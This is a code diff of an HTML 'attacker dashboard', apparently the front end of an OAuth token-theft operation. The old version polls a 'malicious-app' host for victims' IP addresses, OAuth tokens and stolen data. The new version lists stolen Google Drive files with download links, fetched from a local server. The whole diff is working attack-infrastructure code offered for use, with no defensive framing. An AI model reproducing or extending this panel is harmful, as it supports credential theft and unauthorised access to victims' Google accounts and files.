@@ -1,33 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Attacker Dashboard</title>
+    <title>Google Drive Exploitation Dashboard</title>
 </head>
 <body>
-    <h1>Live Stolen Data</h1>
+    <h1>Google Drive Stolen Files</h1>
     <table border="1">
         <thead>
-            <tr><th>Time</th><th>IP</th><th>OAuth Token</th><th>Stolen Data</th></tr>
+            <tr><th>File Name</th><th>Download</th></tr>
         </thead>
         <tbody id="data-table"></tbody>
     </table>
 
     <script>
-        async function fetchData() {
-            let response = await fetch("https://malicious-app.onrender.com/data");
-            let data = await response.json();
+        async function fetchFiles() {
+            let response = await fetch("http://localhost:3000/files");
+            let files = await response.json();
             let table = document.getElementById("data-table");
+
             table.innerHTML = "";
-            data.forEach(item => {
+            files.forEach(file => {
                 table.innerHTML += `<tr>
-                    <td>${new Date().toLocaleTimeString()}</td>
-                    <td>${item.ip}</td>
-                    <td>${item.token}</td>
-                    <td>${JSON.stringify(item.data)}</td>
+                    <td>${file.name}</td>
+                    <td><a href="${file.webViewLink}" target="_blank">Download</a></td>
                 </tr>`;
             });
         }
-        setInterval(fetchData, 3000);
+
+        setInterval(fetchFiles, 5000);
     </script>
 </body>
 </html>
